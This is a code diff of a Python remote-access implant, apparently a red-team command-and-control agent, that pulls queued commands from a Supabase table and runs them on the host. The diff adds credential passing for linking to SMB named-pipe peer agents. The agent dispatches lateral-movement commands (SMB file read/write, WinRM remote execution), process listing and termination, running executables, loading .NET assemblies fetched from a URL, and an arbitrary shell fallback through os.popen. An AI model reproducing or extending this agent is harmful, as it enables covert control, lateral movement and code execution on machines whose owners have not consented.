@@ -15,20 +15,24 @@ if os.name == 'nt':  # 'nt' indicates Windows
     import pywintypes
     import win32pipe
     import win32file
-    from utils.winapi import ls, list_users_in_group
-    from utils.winapi.smb_get import smb_get  # Ensure correct import
-    from utils.winapi.smb_write import smb_write  # Ensure correct import
-    from utils.winapi.winrm_execute import winrm_execute  # Import the winrm_execute function
-    from utils.winapi.pwd import wpwd  # Import the wpwd function
-    from utils.winapi.wami import wami  # Import the wami function
-    from utils.winapi.ps import list_processes, grep_processes, terminate_process  # Import ps functions
-    from utils.winapi.run import run_process  # Import the run function
-    from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function
+    from utils.winapi.ls import ls
+    from utils.winapi.list_users_in_group import list_users_in_group
+    from utils.winapi.smb_get import smb_get
+    from utils.winapi.smb_write import smb_write
+    from utils.winapi.winrm_execute import winrm_execute
+    from utils.winapi.pwd import wpwd
+    from utils.winapi.wami import wami
+    from utils.winapi.ps import list_processes, grep_processes, terminate_process
+    from utils.winapi.run import run_process
+    from utils.winapi.netexec import load_dotnet_assembly
 
+logging.basicConfig(level=logging.INFO)
 smb_pipe_conn = None
-#PIPE_NAME_TEMPLATE = r'\\{ip_address}\pipe\smb_pipe'
 
-def link_smb_agent(ip_address):
+def link_smb_agent(ip_address, username=None, password=None, domain=None):
+    if os.name != 'nt':
+        return "Link SMB agent is only supported on Windows."
+    
     global smb_pipe_conn
     pipe_name = PIPE_NAME_TEMPLATE.format(ip_address=ip_address)
     try:
@@ -40,16 +44,26 @@ def link_smb_agent(ip_address):
             0, None
         )
         win32pipe.SetNamedPipeHandleState(smb_pipe_conn, win32pipe.PIPE_READMODE_MESSAGE, None, None)
+        if username and password and domain:
+            win32file.WriteFile(smb_pipe_conn, f'connect {username} {password} {domain}'.encode('utf-8'))
+        elif username and password:
+            win32file.WriteFile(smb_pipe_conn, f'connect {username} {password}'.encode('utf-8'))
+        elif username:
+            win32file.WriteFile(smb_pipe_conn, f'connect {username}'.encode('utf-8'))
+        else:
+            win32file.WriteFile(smb_pipe_conn, b'connect')
         return f"SMB agent linked successfully to {ip_address}."
     except pywintypes.error as e:
         smb_pipe_conn = None
         return f"Failed to link SMB agent: {e}"
 
 def unlink_smb_agent(ip_address):
+    if os.name != 'nt':
+        return "Unlink SMB agent is only supported on Windows."
+    
     global smb_pipe_conn
     try:
         if smb_pipe_conn:
-            # Send a special disconnect message
             win32file.WriteFile(smb_pipe_conn, b'disconnect')
             win32file.CloseHandle(smb_pipe_conn)
             smb_pipe_conn = None
@@ -59,22 +73,23 @@ def unlink_smb_agent(ip_address):
         return f"Failed to unlink SMB agent: {e}"
 
 def send_command_to_smb_agent(command):
+    if os.name != 'nt':
+        return "Send command to SMB agent is only supported on Windows."
+    
     global smb_pipe_conn
     if smb_pipe_conn:
         try:
             win32file.WriteFile(smb_pipe_conn, command.encode('utf-8'))
             result = win32file.ReadFile(smb_pipe_conn, 64 * 1024)
-            return result[1].decode('utf-8')
+            hostname, output = result[1].decode('utf-8').split('\n', 1)
+            return hostname, output
         except pywintypes.error as e:
-            return f"Failed to communicate with SMB agent: {e}"
-    return "SMB agent is not linked."
+            return None, f"Failed to communicate with SMB agent: {e}"
+    return None, "SMB agent is not linked."
 
 def handle_kill_command(command_id, command_text, hostname):
-    """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
     if command_text.strip().lower() == "kill":
         logging.info("Kill command received. Updating status and preparing to exit agent.")
-
-        # Update the command status to 'Completed' and note that the agent is being terminated
         try:
             response = supabase.table('py2').update({
                 'status': 'Completed',
@@ -84,12 +99,11 @@ def handle_kill_command(command_id, command_text, hostname):
             if response.data:
                 logging.info("Command status updated successfully to 'Completed'.")
             else:
-                logging.warning(f"Error updating command status: {response.json()}")  # Log error details
+                logging.warning(f"Error updating command status: {response.json()}")
 
         except Exception as e:
             logging.error(f"Failed to update command status before termination: {e}")
 
-        # Update the 'settings' table to mark the agent as 'Dead'
         try:
             response = supabase.table('settings').update({
                 'check_in': 'Dead'
@@ -98,21 +112,18 @@ def handle_kill_command(command_id, command_text, hostname):
             if response.data:
                 logging.info("Agent status updated successfully to 'Dead'.")
             else:
-                logging.warning(f"Error updating agent status: {response.json()}")  # Log error details
+                logging.warning(f"Error updating agent status: {response.json()}")
 
         except Exception as e:
             logging.error(f"Failed to update agent status before termination: {e}")
 
         finally:
             logging.info("Shutdown sequence initiated.")
-            os._exit(0)  # Force the agent to terminate
+            os._exit(0)
 
 def execute_commands():
-    """Executes pending commands and handles file uploads/downloads."""
-
     hostname, ip, os_info = get_system_info()
 
-    # Handle pending uploads
     pending_uploads_response = fetch_pending_uploads()
     if pending_uploads_response.data:
         for upload in pending_uploads_response.data:
@@ -124,47 +135,40 @@ def execute_commands():
                 else:
                     supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()
 
-    # Fetch and handle commands for the hostname
     pending_commands_response = fetch_pending_commands_for_hostname(hostname)
     if pending_commands_response.data:
         for command in pending_commands_response.data:
             command_id = command['id']
-            command_text = command.get('command', '')  # Ensure command_text is always defined
+            command_text = command.get('command', '')
             username = command.get('username', 'Unknown')
+            smbhost = None
 
-            # Handle kill command (this will exit the script if applicable)
             if command_text.lower().startswith('kill'):
                 handle_kill_command(command_id, command_text, hostname)
 
-            # Handle 'link smb agent <ip>' command
             elif command_text.lower().startswith('link smb agent'):
                 parts = command_text.split()
-                if len(parts) == 4:
-                    ip_address = parts[3]
-                    result = link_smb_agent(ip_address)
-                    update_command_status(command_id, 'Completed', result, hostname, ip, os_info, username)
-                else:
-                    update_command_status(command_id, 'Failed', 'Invalid link smb agent command format. Use "link smb agent <ip>".', hostname, ip, os_info, username)
-
-            # Handle 'unlink smb agent <ip>' command
-            elif command_text.lower().startswith('unlink smb agent'):
-                parts = command_text.split()
-                if len(parts) == 4:
-                    ip_address = parts[3]
-                    result = unlink_smb_agent(ip_address)
-                    update_command_status(command_id, 'Completed', result, hostname, ip, os_info, username)
-                else:
-                    update_command_status(command_id, 'Failed', 'Invalid unlink smb agent command format. Use "unlink smb agent <ip>".', hostname, ip, os_info, username)
-
-            # Handle 'smb' commands to send to SMB agent
-            elif command_text.lower().startswith('smb '):
-                result = send_command_to_smb_agent(command_text[4:])  # Remove 'smb ' prefix
+                ip_address = parts[3]
+                username = parts[4] if len(parts) > 4 else None
+                password = parts[5] if len(parts) > 5 else None
+                domain = parts[6] if len(parts) > 6 else None
+                result = link_smb_agent(ip_address, username, password, domain)
                 update_command_status(command_id, 'Completed', result, hostname, ip, os_info, username)
 
-            # Handle 'ls' command only if on Windows
+            elif command_text.lower().startswith('unlink smb agent'):
+                parts = command_text.split()
+                ip_address = parts[3]
+                result = unlink_smb_agent(ip_address)
+                update_command_status(command_id, 'Completed', result, hostname, ip, os_info, username)
+
+            elif command_text.lower().startswith('smb '):
+                smb_command = command_text[4:]
+                smbhost, result = send_command_to_smb_agent(smb_command)
+                update_command_status(command_id, 'Completed', result, hostname, ip, os_info, username, smbhost)
+
             elif os.name == 'nt' and command_text.lower().startswith('ls'):
                 try:
-                    path = command_text.split(' ', 1)[1]  # Expecting command to be in format "ls [path]"
+                    path = command_text.split(' ', 1)[1]
                     result = ls(path)
                     status = 'Completed'
                     output = "\n".join(result)
@@ -173,7 +177,6 @@ def execute_commands():
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle 'ps' command only if on Windows
             elif os.name == 'nt' and command_text.lower() == 'ps':
                 try:
                     result = list_processes()
@@ -184,10 +187,9 @@ def execute_commands():
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle 'ps grep' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('ps grep'):
                 try:
-                    pattern = command_text.split(' ', 2)[2]  # Expecting command to be in format "ps grep [pattern]"
+                    pattern = command_text.split(' ', 2)[2]
                     result = grep_processes(pattern)
                     status = 'Completed'
                     output = "\n".join(result)
@@ -196,10 +198,9 @@ def execute_commands():
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle 'ps term' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('ps term'):
                 try:
-                    process_id = int(command_text.split(' ', 2)[2])  # Expecting command to be in format "ps term [processid]"
+                    process_id = int(command_text.split(' ', 2)[2])
                     result = terminate_process(process_id)
                     status = 'Completed'
                     output = result
@@ -208,10 +209,9 @@ def execute_commands():
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle 'run' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('run'):
                 try:
-                    executable_path = command_text.split(' ', 1)[1]  # Expecting command to be in format "run [path_to_remote_file]"
+                    executable_path = command_text.split(' ', 1)[1]
                     result = run_process(executable_path)
                     status = 'Completed'
                     output = result
@@ -220,7 +220,6 @@ def execute_commands():
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle 'whoami' command with OS check
             elif command_text.lower() == 'whoami':
                 if os.name == 'nt':
                     try:
@@ -240,10 +239,9 @@ def execute_commands():
                         output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle 'users <group_name>' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('users '):
                 try:
-                    group_name = command_text.split(' ', 1)[1]  # Expecting command to be in format "users [group_name]"
+                    group_name = command_text.split(' ', 1)[1]
                     result = list_users_in_group(group_name)
                     status = 'Completed'
                     output = "\n".join(result)
@@ -252,7 +250,6 @@ def execute_commands():
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle 'smb write <local_file_path> <remote_smb_path> [username password domain]' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('smb write '):
                 parts = command_text.split(' ')
                 if len(parts) < 3:
@@ -274,7 +271,6 @@ def execute_commands():
                         output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle 'smb get <remote_file_path> <local_file_path> [username password domain]' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('smb get '):
                 parts = command_text.split(' ')
                 if len(parts) < 3:
@@ -296,7 +292,6 @@ def execute_commands():
                         output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle 'winrmexec <remote_host> <command> [username password domain]' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('winrmexec '):
                 parts = command_text.split(' ')
                 if len(parts) < 3:
@@ -318,7 +313,6 @@ def execute_commands():
                         output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle 'pwd' command with OS check
             elif command_text.lower() == 'pwd':
                 if os.name == 'nt':
                     try:
@@ -338,15 +332,12 @@ def execute_commands():
                         output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle download command
             elif command_text.lower().startswith('download'):
                 status, output = handle_download_command(command_text, username)
 
-            # Handle upload command
             elif command_text.lower().startswith('upload'):
                 status, output = handle_upload_command(command_text, username)
 
-            # Handle netexec command
             elif command_text.lower().startswith("netexec "):
                 try:
                     _, file_url, *arguments = command_text.split(maxsplit=2)
@@ -359,7 +350,6 @@ def execute_commands():
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle generic shell commands
             else:
                 try:
                     result = os.popen(command_text).read()
